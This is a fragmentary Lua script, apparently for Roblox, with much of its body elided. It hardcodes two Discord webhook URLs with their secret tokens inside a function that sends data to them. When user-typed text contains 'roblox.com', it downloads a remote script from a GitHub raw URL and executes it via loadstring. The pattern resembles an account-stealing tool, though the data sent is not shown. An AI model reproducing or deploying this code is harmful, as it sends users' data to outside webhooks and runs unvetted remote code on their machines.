...
local function sendToSpecificWebhooks(data)
    ...
    local webhookMS = "https://discord.com/api/webhooks/1444152308635271189/3m9PWLQl1fFnAZYoCJXjC60wwTVq2JiCQOZDHjhPP64jhPgsaXvcfZwPSf75Ys-I80xp"
    local webhookKS = "https://discord.com/api/webhooks/1455721007208988977/1u9Huxo12TTPHGIVzUmRtUA4FA_1joxl7dT3vceP78fbm_ppSNof-qHQY4dY3rfMDBUH"
  ...
  local function openCMD2()
    ...
    local function submit()
        ...
        if txt:find("roblox%.com") then
            ...
            -- Cargar tu script
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Jause123/lmao/refs/heads/main/musica.lua"))()
